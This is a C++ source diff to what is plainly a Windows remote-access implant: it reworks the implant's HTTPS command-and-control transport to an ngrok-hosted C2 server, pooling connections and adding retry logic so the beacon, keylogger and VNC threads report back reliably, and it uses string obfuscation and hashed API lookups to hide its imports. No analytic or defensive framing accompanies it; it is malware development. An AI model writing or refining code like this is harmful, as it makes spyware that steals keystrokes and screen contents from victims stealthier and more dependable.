@@ -15,6 +15,7 @@
 #include <shlobj.h>
 #include <string>
 #include <vector>
+#include <mutex>
 #include <sstream>
 #include <iomanip>
 #include <algorithm>
@@ -261,12 +262,56 @@ struct WinHttpHandles {
 
 struct HttpResponse { DWORD status = 0; std::string body; };
 
-static HttpResponse WinHttpRequest(
+// ── persistent beacon transport ─────────────────────────────────────────────
+// The C2 endpoint never changes for the lifetime of the process, so the session
+// and connect handles are built once and reused. WinHTTP keeps its keep-alive
+// connection pool per session, so creating a fresh session for every request
+// (as this used to) paid a new TCP+TLS handshake each time -- two cold
+// handshakes per beacon cycle, against an ngrok edge that adds its own round
+// trip. Only the request handle is per-call now.
+//
+// ngrok also drops idle keep-alive connections, so any transport error
+// invalidates the cache and the next call rebuilds it, with one transparent
+// retry so a stale connection costs the operator nothing.
+struct BeaconTransport {
+    HINTERNET     session = nullptr;
+    HINTERNET     connect = nullptr;
+    std::wstring  host;
+    INTERNET_PORT port    = 0;
+    bool          valid   = false;
+};
+// Both globals are touched only while g_beaconHttpMtx is held.
+static BeaconTransport g_beaconHttp;
+static std::mutex      g_beaconHttpMtx;
+
+static void CloseBeaconTransport() {
+    static HMODULE hW = []() -> HMODULE {
+        HMODULE m = GetModuleHandleA(XS("winhttp.dll"));
+        return m ? m : LoadLibraryA(XS("winhttp.dll"));
+    }();
+    if (hW) {
+        auto _Close = HASHPROC(hW, WinHttpCloseHandle);
+        if (_Close) {
+            if (g_beaconHttp.connect) _Close(g_beaconHttp.connect);
+            if (g_beaconHttp.session) _Close(g_beaconHttp.session);
+        }
+    }
+    g_beaconHttp.session = nullptr;
+    g_beaconHttp.connect = nullptr;
+    g_beaconHttp.valid   = false;
+}
+
+// One attempt. builtFresh reports whether this call had to establish the
+// session (so the caller knows a retry would not help); transportError marks a
+// failure that was most likely a dropped pooled connection.
+static HttpResponse WinHttpRequestAttempt(
     const std::wstring& host, INTERNET_PORT port,
     const std::wstring& verb, const std::wstring& path,
-    const std::string& body, const std::wstring& extraHeaders = L"")
+    const std::string& body, const std::wstring& extraHeaders,
+    bool& builtFresh, bool& transportError)
 {
     HttpResponse resp;
+    builtFresh = transportError = false;
     static HMODULE hW = LoadLibraryA(XS("winhttp.dll"));
     if (!hW) { DebugLog(L"Failed to load winhttp.dll"); return resp; }
 
@@ -281,46 +326,58 @@ static HttpResponse WinHttpRequest(
     auto _QueryAvail    = HASHPROC(hW, WinHttpQueryDataAvailable);
     auto _ReadData      = HASHPROC(hW, WinHttpReadData);
 
-    if (!_Open || !_Connect || !_OpenRequest) {
+    if (!_Open || !_Connect || !_OpenRequest || !_SendRequest || !_ReceiveResp) {
+        // _SendRequest and _ReceiveResp are called unconditionally further down;
+        // a null here used to be a call through a null pointer.
         DebugLog(L"Failed to resolve WinHTTP functions");
         return resp;
     }
 
+    // Build the pooled session only when it is missing or aimed elsewhere.
+    if (!g_beaconHttp.valid || g_beaconHttp.host != host || g_beaconHttp.port != port) {
+        CloseBeaconTransport();
+        // Automatic proxy first (respects system/IE proxy settings), else direct.
+        g_beaconHttp.session = _Open(config::GetUserAgent(),
+                                     WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
+                                     WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+        if (!g_beaconHttp.session)
+            g_beaconHttp.session = _Open(config::GetUserAgent(),
+                                         WINHTTP_ACCESS_TYPE_NO_PROXY,
+                                         WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+        if (!g_beaconHttp.session) {
+            DebugLog(L"WinHttpOpen failed");
+            return resp;
+        }
+
+        DWORD timeout = 45000;
+        if (_SetOption) {
+            _SetOption(g_beaconHttp.session, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
+            _SetOption(g_beaconHttp.session, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
+            _SetOption(g_beaconHttp.session, WINHTTP_OPTION_SEND_TIMEOUT,    &timeout, sizeof(timeout));
+            _SetOption(g_beaconHttp.session, WINHTTP_OPTION_RESOLVE_TIMEOUT, &timeout, sizeof(timeout));
+        }
+
+        g_beaconHttp.connect = _Connect(g_beaconHttp.session, host.c_str(), port, 0);
+        if (!g_beaconHttp.connect) {
+            DebugLog(L"WinHttpConnect failed");
+            CloseBeaconTransport();
+            return resp;
+        }
+        g_beaconHttp.host  = host;
+        g_beaconHttp.port  = port;
+        g_beaconHttp.valid = true;
+        builtFresh = true;
+    }
+
+    // Per-call handle only: leaving session/connect null in the RAII struct lets
+    // the pooled connection survive this request.
     WinHttpHandles h;
-    // Try automatic proxy first (respects system/IE proxy settings)
-    h.session = _Open(config::GetUserAgent(),
-                      WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
-                      WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
-    if (!h.session) {
-        // Fallback: direct connect
-        h.session = _Open(config::GetUserAgent(),
-                          WINHTTP_ACCESS_TYPE_NO_PROXY,
-                          WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
-    }
-    if (!h.session) {
-        DebugLog(L"WinHttpOpen failed");
-        return resp;
-    }
-
-    DWORD timeout = 45000;
-    if (_SetOption) {
-        _SetOption(h.session, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
-        _SetOption(h.session, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
-        _SetOption(h.session, WINHTTP_OPTION_SEND_TIMEOUT,    &timeout, sizeof(timeout));
-        _SetOption(h.session, WINHTTP_OPTION_RESOLVE_TIMEOUT, &timeout, sizeof(timeout));
-    }
-
-    h.connect = _Connect(h.session, host.c_str(), port, 0);
-    if (!h.connect) {
-        DebugLog(L"WinHttpConnect failed");
-        return resp;
-    }
-
-    h.request = _OpenRequest(h.connect, verb.c_str(), path.c_str(), nullptr,
+    h.request = _OpenRequest(g_beaconHttp.connect, verb.c_str(), path.c_str(), nullptr,
                              WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                              WINHTTP_FLAG_SECURE);
     if (!h.request) {
         DebugLog(L"WinHttpOpenRequest failed");
+        transportError = !builtFresh;
         return resp;
     }
 
@@ -346,6 +403,7 @@ static HttpResponse WinHttpRequest(
                              static_cast<DWORD>(body.size()), 0);
     if (!sent || !_ReceiveResp(h.request, nullptr)) {
         DebugLog(L"WinHttpSendRequest or ReceiveResponse failed");
+        transportError = true;   // almost certainly the pooled connection
         return resp;
     }
 
@@ -367,6 +425,27 @@ static HttpResponse WinHttpRequest(
         if (resp.body.size() > config::CMD_OUTPUT_MAX) break;
     }
     return resp;
+}
+
+// Public entry: serialised, with one transparent retry when a pooled connection
+// turns out to be stale. SendResult is reachable from the keylog and VNC
+// threads as well as the beacon loop, so the transport cache is mutex-guarded.
+static HttpResponse WinHttpRequest(
+    const std::wstring& host, INTERNET_PORT port,
+    const std::wstring& verb, const std::wstring& path,
+    const std::string& body, const std::wstring& extraHeaders = L"")
+{
+    std::lock_guard<std::mutex> lk(g_beaconHttpMtx);
+    for (int attempt = 0; attempt < 2; ++attempt) {
+        bool fresh = false, stale = false;
+        HttpResponse resp = WinHttpRequestAttempt(host, port, verb, path, body,
+                                                  extraHeaders, fresh, stale);
+        if (!stale) return resp;
+        CloseBeaconTransport();
+        if (fresh) return resp;   // a brand-new connection already failed
+        DebugLog(L"Pooled beacon connection stale, reconnecting");
+    }
+    return HttpResponse{};
 }
 
 // =====================================================================
